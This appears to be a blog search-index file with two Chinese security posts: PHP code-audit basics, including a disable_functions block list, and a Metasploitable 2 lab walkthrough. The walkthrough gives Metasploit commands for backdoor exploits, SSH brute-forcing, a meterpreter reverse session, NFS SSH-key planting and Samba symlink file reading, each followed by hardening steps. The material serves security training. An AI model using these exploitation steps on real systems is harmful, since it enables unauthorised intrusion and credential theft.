<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>PHP代码审计基础概念</title>
    <url>/2021/04/10/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E6%A6%82%E8%BF%B0/</url>
    <content><![CDATA[<h1 id="PHP代码审计"><a href="#PHP代码审计" class="headerlink" title="PHP代码审计"></a>PHP代码审计</h1><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><h4 id="代码编辑器"><a href="#代码编辑器" class="headerlink" title="代码编辑器"></a>代码编辑器</h4><ul>
<li>Notepad++</li>
<li>Visual Studio Code</li>
</ul>
<h4 id="代码审计工具"><a href="#代码审计工具" class="headerlink" title="代码审计工具"></a>代码审计工具</h4><ul>
<li>Seay源代码审计系统</li>
<li>Firtufy SCA</li>
<li>RIPS</li>
</ul>
<h4 id="漏洞验证辅助"><a href="#漏洞验证辅助" class="headerlink" title="漏洞验证辅助"></a>漏洞验证辅助</h4><ul>
<li>BurpSuite Community</li>
<li>浏览器扩展</li>
<li>编码转换、加密解密工具 </li>
<li>正则调试工具</li>
<li>SQL执行监控工具</li>
</ul>
<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><blockquote>
<ol>
<li>检查铭感函数的参数，然后回溯变量，判断变量是否可控并且没有经过严格的过滤（逆向追踪）</li>
<li>找出哪些文件在接收外部传入的参数，然后跟踪变量的传递过程，观察是否有变量传入到高危函数中，或者传递的过程中是否有代码逻辑漏洞（正向追踪）</li>
<li>直接挖掘功能点漏洞，根据自身的禁言判断该类应用通常在哪些功能中会出现漏洞，直接全篇阅读该功能代码</li>
</ol>
<ul>
<li>学好代码审计需要掌握一下几点<ul>
<li>PHP编程语言的特性和基础</li>
<li>Web前端编程基础</li>
<li>漏洞形成原理</li>
<li>代码审计思路</li>
<li>不同系统、中间件之间的特性差异</li>
</ul>
</li>
</ul>
</blockquote>
<h3 id="PHP核心配置"><a href="#PHP核心配置" class="headerlink" title="PHP核心配置"></a>PHP核心配置</h3><p>​                                                            <strong>常见<code>PHP_INI_*</code>常量的定义</strong></p>
<table>
<thead>
<tr>
<th align="center">常量</th>
<th align="center">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><strong>PHP_INI_USER</strong></td>
<td align="center">该配置选项可在用户的PHP脚本或Windows注册表中设置</td>
</tr>
<tr>
<td align="center"><strong>PHP_INI_PERDIR</strong></td>
<td align="center">该配置选项可在<code>php.ini</code>、<code>.htaccess</code>或<code>httpd.conf</code>中设置</td>
</tr>
<tr>
<td align="center"><strong>PHP_INI_SYSTEM</strong></td>
<td align="center">该配置选项可在<code>php.ini</code>或<code>httpd.conf</code>中配置</td>
</tr>
<tr>
<td align="center"><strong>PHP_INI_ALL</strong></td>
<td align="center">该配置选项可在任何地方设置</td>
</tr>
<tr>
<td align="center"><strong>php.ini.only</strong></td>
<td align="center">该配置选项可仅可在php.ini中配置</td>
</tr>
</tbody></table>
<h4 id="常见核心配置"><a href="#常见核心配置" class="headerlink" title="常见核心配置"></a><strong>常见核心配置</strong></h4><p><font size='4' color='red'>register_globals(全局变量注册开关)</font></p>
<blockquote>
<p>版本：&lt;= <code>PHP 5.3.0</code></p>
</blockquote>
<p>在选项设置为on的情况下，会直接吧用户GET、POST等方式提交上来的参数注册成全局变量并初始化值为参数对应的值，使得提交的参数可以直接在脚本中使用</p>
<p><font size='4' color='red'>allow_url_include(是否允许包含远程文件)</font></p>
<blockquote>
<p>版本：<code>PHP all</code>    PHP 5.2.0之后默认为Off</p>
<p>类似函数：<code>allow_url_fopen(是否打开远程文件)</code></p>
</blockquote>
<p>在该配置为on的情况下，它可以直接远程包含文件，当存在<code>include($var)</code>并且<code>$var</code>可控的情况下，可以直接控制其来执行PHP代码</p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201217095516607.png" alt="image-20201217095516607"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201217100014708.png" alt="image-20201217100014708"></p>
<p><font size='4' color='red'>magic_quotes_gpc(魔术引号自动过滤)</font></p>
<blockquote>
<p>版本：<code>&lt; PHP 5.4</code>；    <code>PHP 5.3</code>之后不推荐使用该函数</p>
<p>置返回： <code>&lt; PHP 4.2.3</code>配置范围为PHP_INI_ALL；<code>&gt; PHP 4.2.3</code>配置范围为PHP_INI_PERDIR</p>
</blockquote>
<p>当选项为On时，在不存在编码或者其他绕过绕过的情况下，可以使得很多漏洞无法利用，他会自动在GET、POST、COOKIE变量中的单引号<code>&#39;&#39;</code>、双引号<code>&quot;&quot;</code>、反斜杠<code>\</code>以及空字符<code>NULL</code>的前面加上反斜杠</p>
<p>在<code>PHP5</code>中<code>magic_quotes_gpc</code>不会过滤<code>$_SERVER</code>变量，导致很多client-ip、referer一类的漏洞能够利用。</p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201217102901642.png" alt="image-20201217102901642"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201217103333525.png" alt="image-20201217103333525"></p>
<p><font size='4' color='red'>open_basedir(PHP可访问目录)</font></p>
<blockquote>
<p>版本：PHP ALL</p>
<p>范围：<code>&lt; PHP 5.2.3</code>配置范围为PHP_INI_SYSTEM；<code>&gt; PHP 5.2.3</code>配置范围PHP_INI_ALL</p>
</blockquote>
<p><code>open_basedir</code>指令用来限制PHP只能访问哪些目录，通常只需要设置Web文件目录即可，如果需要加载其他外部脚本，也需要吧脚本所在的目录路径加入到<code>open_basedir</code>指令中，多个目录用分号(<code>;</code>)分隔</p>
<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment"># `open_basedir`指定的实际上时前缀，而不是目录名</span>
open_basedir<span class="token operator">=</span><span class="token operator">/</span>www<span class="token operator">/</span>a        
<span class="token shell-comment comment"># 设定可访问的目录为/www下以a开头的文件，也就是说/www/a和/www/ab都可以被访问</span>
open_basedir<span class="token operator">=</span><span class="token operator">/</span>www<span class="token operator">/</span>a<span class="token operator">/</span>
<span class="token shell-comment comment"># 设置只能访问/www/a文件</span>
</code></pre>
<p>当<code>open_basedir</code>配置目录后，执行脚本访问其他函数都需要验证文件是否符合配置要求，因此会影响效率</p>
<p><font size='4' color='red'>disable_functions(禁用函数)</font></p>
<blockquote>
<p>版本：PHP ALL</p>
<p>范围：该指令的配置范围为<code>php.ini only</code></p>
</blockquote>
<p>在正式生产环境中，为了更安全地允许PHP，也可以使用<code>disable_functions</code>指令来禁止一些敏感函数的使用。当你使用该指令禁用危险函数时，切记将<code>dl()</code>函数加到禁止列表中，因为攻击者可以利用<code>dl()</code>函数来加载自定义的PHP扩展以突破<code>disable_functions</code>的限定</p>
<pre class=" language-php"><code class="language-php"><span class="token shell-comment comment"># 多个函数之间用逗号（,）分隔</span>
disable_functions<span class="token operator">=</span>phpinfo<span class="token punctuation">,</span>eval<span class="token punctuation">,</span>passthru<span class="token punctuation">,</span>exec<span class="token punctuation">,</span>system<span class="token punctuation">,</span>dl
</code></pre>
<p><font size='4' color='red'>disable_errors和error_reporting(错误显示)</font></p>
<blockquote>
<p>版本：PHP ALL</p>
<p>配置范围：PHP_INI_ALL</p>
</blockquote>
<p><code>disable_errors</code>表明是否显示PHP脚本内部的错误，在调试时通常将PHP错误显示打开，但是在生产环境中，建议关闭PHP错误回显。</p>
<p>为了避免一些安全隐患，在设置<code>disable_errors=On</code>时，还可以配置<code>error_reporting</code>，这个选项用来配置错误显示的级别，可使用数字也可使用内置常量配置。</p>
<p>​                                                                <strong>数字格式与变量格式的详细信息</strong></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201217152415931.png" alt="image-20201217152415931"></p>
<p>​                                                                             <strong>常用指令及说明</strong></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20201217154018469.png" alt="image-20201217154018469"></p>
]]></content>
  </entry>
  <entry>
    <title>Metasploitable 2</title>
    <url>/2021/04/10/Metasploitable2/</url>
    <content><![CDATA[<h1 id="Metasploitable-2"><a href="#Metasploitable-2" class="headerlink" title="Metasploitable 2"></a>Metasploitable 2</h1><blockquote>
<p>未加固前端口开放情况</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120095921374.png" alt="image-20210120095921374"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120095940587.png" alt="image-20210120095940587"></p>
<h2 id="vsftpd-2-3-4-21"><a href="#vsftpd-2-3-4-21" class="headerlink" title="vsftpd 2.3.4(21)"></a>vsftpd 2.3.4(21)</h2><h4 id="发现漏洞"><a href="#发现漏洞" class="headerlink" title="发现漏洞"></a>发现漏洞</h4><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120101906495.png" alt="image-20210120101906495"></p>
<h4 id="验证漏洞"><a href="#验证漏洞" class="headerlink" title="验证漏洞"></a>验证漏洞</h4><pre class=" language-shell"><code class="language-shell">┌──(sheng㉿sheng)-[~]
└─$ msfconsole 
msf6 > search vsftpd 234
msf6 > use 0
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 172.16.107.245
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120101009039.png" alt="image-20210120101009039"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120101332372.png" alt="image-20210120101332372"></p>
<blockquote>
<p>获得root用户弱口令</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120101535563.png" alt="image-20210120101535563"></p>
<h4 id="安全加固"><a href="#安全加固" class="headerlink" title="安全加固"></a>安全加固</h4><blockquote>
<p>通过防火墙过滤6200后门端口</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120101633327.png" alt="image-20210120101633327"></p>
<blockquote>
<p>验证加固成功，该漏洞无法利用</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120101729849.png" alt="image-20210120101729849"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120101748984.png" alt="image-20210120101748984"></p>
<h2 id="ssh弱口令-22"><a href="#ssh弱口令-22" class="headerlink" title="ssh弱口令(22)"></a>ssh弱口令(22)</h2><h4 id="发现漏洞-1"><a href="#发现漏洞-1" class="headerlink" title="发现漏洞"></a>发现漏洞</h4><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120101846407.png" alt="image-20210120101846407"></p>
<h4 id="验证漏洞-1"><a href="#验证漏洞-1" class="headerlink" title="验证漏洞"></a>验证漏洞</h4><pre class=" language-shell"><code class="language-shell">┌──(sheng㉿sheng)-[~]
└─$ msfconsole 
msf6 > search ssh_login
msf6 > use 0
msf6 auxiliary(scanner/ssh/ssh_login) > set rhosts 172.16.107.245
msf6 auxiliary(scanner/ssh/ssh_login) > set username root
msf6 auxiliary(scanner/ssh/ssh_login) > set pass_file dic.txt
msf6 auxiliary(scanner/ssh/ssh_login) > exploit
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120102402477.png" alt="image-20210120102402477"></p>
<h4 id="安全加固-1"><a href="#安全加固-1" class="headerlink" title="安全加固"></a>安全加固</h4><blockquote>
<p>禁止root用户远程登入（<code>vim /etc/ssh/sshd_config</code>）</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120102630134.png" alt="image-20210120102630134"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120102658839.png" alt="image-20210120102658839"></p>
<blockquote>
<p>验证无法远程登入root用户(密码未修改)</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120102823979.png" alt="image-20210120102823979"></p>
<blockquote>
<p> 修改弱口令</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120103353588.png" alt="image-20210120103353588"></p>
<h2 id="telnet弱口令-23"><a href="#telnet弱口令-23" class="headerlink" title="telnet弱口令(23)"></a>telnet弱口令(23)</h2><h4 id="发现漏洞-2"><a href="#发现漏洞-2" class="headerlink" title="发现漏洞"></a>发现漏洞</h4><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120103848150.png" alt="image-20210120103848150"></p>
<h4 id="验证漏洞-2"><a href="#验证漏洞-2" class="headerlink" title="验证漏洞"></a>验证漏洞</h4><pre class=" language-shell"><code class="language-shell">telnet 172.16.107.245
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120103818938.png" alt="image-20210120103818938"></p>
<h4 id="安全加固-2"><a href="#安全加固-2" class="headerlink" title="安全加固"></a>安全加固</h4><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120104011808.png" alt="image-20210120104011808"></p>
<blockquote>
<p>验证漏洞已修复</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120104044715.png" alt="image-20210120104044715"></p>
<h2 id="PHP-CGI参数注入执行漏洞-80"><a href="#PHP-CGI参数注入执行漏洞-80" class="headerlink" title="PHP CGI参数注入执行漏洞(80)"></a>PHP CGI参数注入执行漏洞(80)</h2><h4 id="发现漏洞-3"><a href="#发现漏洞-3" class="headerlink" title="发现漏洞"></a>发现漏洞</h4><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120171908882.png" alt="image-20210120171908882"></p>
<h4 id="验证漏洞-3"><a href="#验证漏洞-3" class="headerlink" title="验证漏洞"></a>验证漏洞</h4><blockquote>
<p>url最后添加<code>?-s</code>,即可看到页面的源代码</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124205259043.png" alt="image-20210124205259043"></p>
<pre class=" language-shell"><code class="language-shell">┌──(sheng㉿sheng)-[~]
└─$ msfconsole 
msf6 > search PHP_CGI
msf6 > use use exploit/multi/http/php_cgi_arg_injection
msf6 exploit(multi/http/php_cgi_arg_injection) > set rhosts 172.16.107.245
msf6 exploit(multi/http/php_cgi_arg_injection) > exploit
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120172108109.png" alt="image-20210120172108109"></p>
<h4 id="安全加固（未）"><a href="#安全加固（未）" class="headerlink" title="安全加固（未）"></a>安全加固（未）</h4><h2 id="NFS共享目录配置漏洞-111"><a href="#NFS共享目录配置漏洞-111" class="headerlink" title="NFS共享目录配置漏洞(111)"></a>NFS共享目录配置漏洞(111)</h2><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120173743841.png" alt="image-20210120173743841"></p>
<h4 id="发现漏洞-4"><a href="#发现漏洞-4" class="headerlink" title="发现漏洞"></a>发现漏洞</h4><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120173710742.png" alt="image-20210120173710742"></p>
<h4 id="验证漏洞-4"><a href="#验证漏洞-4" class="headerlink" title="验证漏洞"></a>验证漏洞</h4><blockquote>
<p>查看NFS服务是否开启</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120173826148.png" alt="image-20210120173826148"></p>
<blockquote>
<p>查看远程共享目录列表</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120173906774.png" alt="image-20210120173906774"></p>
<blockquote>
<p>生产rsa公钥</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120173945733.png" alt="image-20210120173945733"></p>
<blockquote>
<p>创建共享目录</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120194742126.png" alt="image-20210120194742126"></p>
<blockquote>
<p>将靶机共享的目录挂在到该文件夹下</p>
<p>若出现<code>mount.nfs:……</code>报错，需要<code>/etc/init.d/rpcbind start</code>来启动mount</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120194858710.png" alt="image-20210120194858710"></p>
<blockquote>
<p>将公钥追加到靶机的<code>authorized_keys</code>下</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120195245907.png" alt="image-20210120195245907"></p>
<blockquote>
<p>实现无密码远程登入</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120195548116.png" alt="image-20210120195548116"></p>
<h4 id="安全加固-3"><a href="#安全加固-3" class="headerlink" title="安全加固"></a>安全加固</h4><blockquote>
<p>不共享根目录，共享一个低权限目录，共享权限变低</p>
<p>(/etc/exports)</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120195907301.png" alt="++"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210312154052116.png" alt="image-20210312154052116"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120200101005.png" alt="image-20210120200101005"></p>
<h2 id="Samba-MS-RPC-Shell命令注入漏洞-139"><a href="#Samba-MS-RPC-Shell命令注入漏洞-139" class="headerlink" title="Samba MS-RPC Shell命令注入漏洞(139)"></a>Samba MS-RPC Shell命令注入漏洞(139)</h2><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120165159267.png"></p>
<h4 id="发现漏洞-5"><a href="#发现漏洞-5" class="headerlink" title="发现漏洞"></a>发现漏洞</h4><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120165400551.png" alt="image-20210120165400551"></p>
<h4 id="验证漏洞-5"><a href="#验证漏洞-5" class="headerlink" title="验证漏洞"></a>验证漏洞</h4><pre class=" language-shell"><code class="language-shell">┌──(sheng㉿sheng)-[~]
└─$ msfconsole 
msf6 > search usermap_script
msf6 > use exploit/multi/samba/usermap_script
msf6 exploit(multi/samba/usermap_script) > set rhosts 172.16.107.245
msf6 exploit(multi/samba/usermap_script) > set lhost 172.16.107.14 
msf6 exploit(multi/samba/usermap_script) > set lport 4445
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120165544774.png" alt="image-20210120165544774"></p>
<h4 id="安全加固-4"><a href="#安全加固-4" class="headerlink" title="安全加固"></a>安全加固</h4><pre class=" language-shell"><code class="language-shell">vim /etc/samba/smb.conf
</code></pre>
<blockquote>
<p>将<code>username……</code>一行注释掉</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120165804318.png" alt="image-20210120165804318"></p>
<blockquote>
<p>重启服务</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120165955787.png" alt="image-20210120165955787"></p>
<blockquote>
<p>验证该漏洞无法利用</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120170023643.png" alt="image-20210120170023643"></p>
<h2 id="Samba-sysmlink默认配置目录遍历漏洞-445"><a href="#Samba-sysmlink默认配置目录遍历漏洞-445" class="headerlink" title="Samba sysmlink默认配置目录遍历漏洞(445)"></a>Samba sysmlink默认配置目录遍历漏洞(445)</h2><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124200239594.png" alt="image-20210124200239594"></p>
<h4 id="发现漏洞-6"><a href="#发现漏洞-6" class="headerlink" title="发现漏洞"></a>发现漏洞</h4><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124195932087.png" alt="image-20210124195932087"></p>
<h4 id="验证漏洞-6"><a href="#验证漏洞-6" class="headerlink" title="验证漏洞"></a>验证漏洞</h4><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124200301938.png" alt="image-20210124200301938"></p>
<blockquote>
<p>smbclient从4.11开始协议取消了nt1,使用smbv2,所以导致协议不能协商,会出现<code>protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED</code>报错</p>
</blockquote>
<p> <strong>解决方法:</strong></p>
<blockquote>
<p>如果是直接连接服务器,服务器是linux平台搭建的samba,就直接客户端访问的时候添加<code>--option=&#39;client min protocol=nt1&#39;</code></p>
<pre class=" language-shell"><code class="language-shell">smbclient //172.16.10.189/tmp --option='client min protocol=nt1'
</code></pre>
</blockquote>
<blockquote>
<p>在新窗口下执行smbclient命令打开上面生产的共享目录</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124200628807.png" alt="image-20210124200628807"></p>
<blockquote>
<p>进入rootfs目录</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124201146510.png" alt="image-20210124201146510"></p>
<blockquote>
<p>列出密码文件,利用成功</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124201222143.png" alt="image-20210124201222143"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124201212714.png" alt="image-20210124201212714"></p>
<h4 id="安全加固-5"><a href="#安全加固-5" class="headerlink" title="安全加固"></a>安全加固</h4><blockquote>
<p>通过查看配置文件可以看到有两个共享文件夹</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124201655657.png" alt="image-20210124201655657"></p>
<blockquote>
<p>分别查看两个共享目录</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124201745691.png" alt="image-20210124201745691"></p>
<blockquote>
<p>查看/tmp的详细信息</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124201836450.png" alt="image-20210124201836450"></p>
<blockquote>
<p>删除共享中的软链接即可</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124201945075.png" alt="image-20210124201945075"></p>
<blockquote>
<p>验证漏洞无法利用</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124202046456.png" alt="image-20210124202046456"></p>
<h2 id="Rlogin后门漏洞-512-513-514"><a href="#Rlogin后门漏洞-512-513-514" class="headerlink" title="Rlogin后门漏洞(512,513,514)"></a>Rlogin后门漏洞(512,513,514)</h2><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120112331605.png" alt="image-20210120112331605"></p>
<h4 id="发现漏洞-7"><a href="#发现漏洞-7" class="headerlink" title="发现漏洞"></a>发现漏洞</h4><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120105428996.png" alt="image-20210120105428996"></p>
<h4 id="验证漏洞-7"><a href="#验证漏洞-7" class="headerlink" title="验证漏洞"></a>验证漏洞</h4><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120105400982.png" alt="image-20210120105400982"></p>
<h4 id="安全加固-6"><a href="#安全加固-6" class="headerlink" title="安全加固"></a>安全加固</h4><blockquote>
<p>删除危险账户，设置可登入系统的账户密码为高难度密码</p>
</blockquote>
<h2 id="Java-RMI-SERVER命令执行漏洞-1099-48319"><a href="#Java-RMI-SERVER命令执行漏洞-1099-48319" class="headerlink" title="Java RMI SERVER命令执行漏洞(1099,48319)"></a>Java RMI SERVER命令执行漏洞(1099,48319)</h2><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120112304469.png" alt="image-20210120112304469"></p>
<h4 id="发现漏洞-8"><a href="#发现漏洞-8" class="headerlink" title="发现漏洞"></a>发现漏洞</h4><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120112247006.png" alt="image-20210120112247006"></p>
<h4 id="验证漏洞-8"><a href="#验证漏洞-8" class="headerlink" title="验证漏洞"></a>验证漏洞</h4><pre class=" language-shell"><code class="language-shell">┌──(sheng㉿sheng)-[~/Desktop]
└─$ msfconsole 
msf6 > search java_rmi
msf6 > use auxiliary/scanner/misc/java_rmi_server
msf6 auxiliary(scanner/misc/java_rmi_server) > set rhosts 172.16.107.245
msf6 auxiliary(scanner/misc/java_rmi_server) > exploit 

[+] 172.16.107.245:1099   - 172.16.107.245:1099 Java RMI Endpoint Detected: Class Loader Enabled
[*] 172.16.107.245:1099   - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/1.png" alt="1"></p>
<pre class=" language-shell"><code class="language-shell">msf6  > use exploit/multi/misc/java_rmi_server
msf6 exploit(multi/misc/java_rmi_server) > set rhosts 172.16.107.245
rhosts => 172.16.107.245
msf6 exploit(multi/misc/java_rmi_server) > set lhost 172.16.107.14 
lhost => 172.16.107.14
msf6 exploit(multi/misc/java_rmi_server) > exploit 
......
meterpreter > 
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120112953097.png" alt="image-20210120112953097"></p>
<h4 id="安全加固-7"><a href="#安全加固-7" class="headerlink" title="安全加固"></a>安全加固</h4><blockquote>
<p>最有效的加固方法是安装补丁或者升级</p>
<p>如果在无法立即安装补丁或者升级的情况下,可以使用防火墙规则来阻止服务器被攻击</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120113148634.png" alt="image-20210120113148634"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120113217383.png" alt="image-20210120113217383"></p>
<h2 id="Ingreslock后门漏洞-1524"><a href="#Ingreslock后门漏洞-1524" class="headerlink" title="Ingreslock后门漏洞(1524)"></a>Ingreslock后门漏洞(1524)</h2><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120112319314.png" alt="image-20210120112319314"></p>
<h4 id="发现漏洞-9"><a href="#发现漏洞-9" class="headerlink" title="发现漏洞"></a>发现漏洞</h4><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120145119976.png" alt="image-20210120145119976"></p>
<h4 id="验证漏洞-9"><a href="#验证漏洞-9" class="headerlink" title="验证漏洞"></a>验证漏洞</h4><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120145008922.png" alt="image-20210120145008922"></p>
<h4 id="安全加固-8"><a href="#安全加固-8" class="headerlink" title="安全加固"></a>安全加固</h4><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120145312535.png" alt="image-20210120145312535"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120145327599.png" alt="image-20210120145327599"></p>
<h2 id="MySQL弱口令-3306"><a href="#MySQL弱口令-3306" class="headerlink" title="MySQL弱口令(3306)"></a>MySQL弱口令(3306)</h2><h4 id="发现漏洞-10"><a href="#发现漏洞-10" class="headerlink" title="发现漏洞"></a>发现漏洞</h4><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120114129835.png" alt="image-20210120114129835"></p>
<h4 id="验证漏洞-10"><a href="#验证漏洞-10" class="headerlink" title="验证漏洞"></a>验证漏洞</h4><pre class=" language-shell"><code class="language-shell">mysql -h 172.16.107.245 -uroot -p
空密码
</code></pre>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210120114426224.png" alt="image-20210120114426224"></p>
<h4 id="安全加固-9"><a href="#安全加固-9" class="headerlink" title="安全加固"></a>安全加固</h4><blockquote>
<p>添加root强密码</p>
<p>删除其他可远程登入数据库的危险账户</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124144245892.png" alt="image-20210124144245892"></p>
<h2 id="Distcc后门漏洞-3632"><a href="#Distcc后门漏洞-3632" class="headerlink" title="Distcc后门漏洞(3632)"></a>Distcc后门漏洞(3632)</h2><h4 id="发现漏洞-11"><a href="#发现漏洞-11" class="headerlink" title="发现漏洞"></a>发现漏洞</h4><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124154249602.png" alt="image-20210124154249602"></p>
<h4 id="验证漏洞-11"><a href="#验证漏洞-11" class="headerlink" title="验证漏洞"></a>验证漏洞</h4><p>使用<code>distcc_exec</code>模块</p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124154527664.png" alt="image-20210124154527664"></p>
<h4 id="安全加固-10"><a href="#安全加固-10" class="headerlink" title="安全加固"></a>安全加固</h4><blockquote>
<p>使用防火墙策略</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124154809595.png" alt="image-20210124154809595"></p>
<blockquote>
<p>验证漏洞无法利用</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124154850996.png" alt="image-20210124154850996"></p>
<h2 id="vnc默认密码登入-5200"><a href="#vnc默认密码登入-5200" class="headerlink" title="vnc默认密码登入(5200)"></a>vnc默认密码登入(5200)</h2><h4 id="发现漏洞-12"><a href="#发现漏洞-12" class="headerlink" title="发现漏洞"></a>发现漏洞</h4><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124133734304.png" alt="image-20210124133734304"></p>
<h4 id="验证漏洞-12"><a href="#验证漏洞-12" class="headerlink" title="验证漏洞"></a>验证漏洞</h4><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124134112243.png" alt="image-20210124134112243"></p>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124134224583.png" alt="image-20210124134224583"></p>
<h4 id="安全加固-11"><a href="#安全加固-11" class="headerlink" title="安全加固"></a>安全加固</h4><blockquote>
<p>修改vnc连接密码为强密码</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124134347329.png" alt="image-20210124134347329"></p>
<blockquote>
<p>验证漏洞无法再次利用</p>
</blockquote>
<p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124134405396.png" alt="image-20210124134405396"></p>
<h2 id="UnrealRCd后门漏洞-6667-6697"><a href="#UnrealRCd后门漏洞-6667-6697" class="headerlink" title="UnrealRCd后门漏洞(6667,6697)"></a>UnrealRCd后门漏洞(6667,6697)</h2><h4 id="发现漏洞-13"><a href="#发现漏洞-13" class="headerlink" title="发现漏洞"></a>发现漏洞</h4><p><img src="https://gitee.com/ms12020/picture/raw/master/images/image-20210124155512096.png" alt="image-20210124155512096"></p>
